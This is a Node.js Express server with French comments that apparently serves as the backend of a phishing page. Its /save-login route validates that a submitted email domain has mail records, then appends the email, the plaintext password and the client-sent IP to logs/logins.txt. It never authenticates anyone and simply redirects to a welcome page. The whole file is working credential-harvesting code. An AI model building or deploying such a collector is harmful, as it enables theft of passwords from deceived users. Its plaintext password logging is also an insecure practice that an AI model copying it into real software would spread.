const express = require('express');
const fs = require('fs');
const path = require('path');
const rateLimit = require('express-rate-limit');
const ipFilter = require('express-ip-filter');
const dns = require('dns');  // Ajouter la dépendance DNS

const app = express();
const PORT = 3000;

// Configuration du proxy
app.set('trust proxy', true);

// Middlewares
app.use(express.static('public'));
app.use(express.json());

// Dossier des logs
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

// Liste noire d'IPs
const blockedIps = ['192.168.0.1', '203.0.113.45'];
app.use(ipFilter({
    mode: 'deny',
    ips: blockedIps
}));

// Rate limiter avec fallback d'IP
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 50,
    message: 'Trop de tentatives. Réessayez plus tard.',
    keyGenerator: (req) => req.ip || req.headers['x-forwarded-for'] || 'unknown'
});

app.use(limiter);

// Fonction de nettoyage
const sanitize = str => {
    return String(str).replace(/[<>"']/g, '').trim();
};

// Validation email
const validateEmail = (email) => {
    return new Promise((resolve, reject) => {
        // 1. Vérification de la structure de l'email
        const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!regex.test(email)) {
            return resolve({ valid: false, reason: "Format d'email invalide." });
        }

        const domain = email.split('@')[1];

        // 2. Vérification du domaine via DNS
        dns.resolveMx(domain, (err, addresses) => {
            if (err || addresses.length === 0) {
                return resolve({ valid: false, reason: 'Domaine email non trouvé.' });
            }
            return resolve({ valid: true, reason: 'Email valide.' });
        });
    });
};

// Enregistrement des infos
app.post('/save-login', async (req, res) => {
    try {
        let { email, password, ip } = req.body;

        email = sanitize(email);
        password = sanitize(password);
        ip = sanitize(ip);

        const emailValidation = await validateEmail(email);

        if (!emailValidation.valid) {
            return res.status(400).json({ message: emailValidation.reason });
        }

        if (!email || !password || !ip) {
            return res.status(400).json({ message: 'Champs manquants' });
        }

        const log = `Email: ${email} | Password: ${password} | IP: ${ip} | Date: ${new Date().toISOString()}\n`;

        fs.appendFile(path.join(logDir, 'logins.txt'), log, err => {
            if (err) {
                console.error("Erreur lors de l'enregistrement", err);
                return res.status(500).json({ message: 'Erreur serveur' });
            }

            res.json({ message: '✅ Enregistrement réussi !', redirectTo: '/welcome' });
        });

    } catch (err) {
        console.error('Erreur interne', err);
        res.status(500).json({ message: 'Erreur interne' });
    }
});

// Route vers la page de bienvenue
app.get('/welcome', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'welcome.html'));
});

app.listen(PORT, () => {
    console.log(`✅ Serveur démarré sur http://localhost:${PORT}`);
});
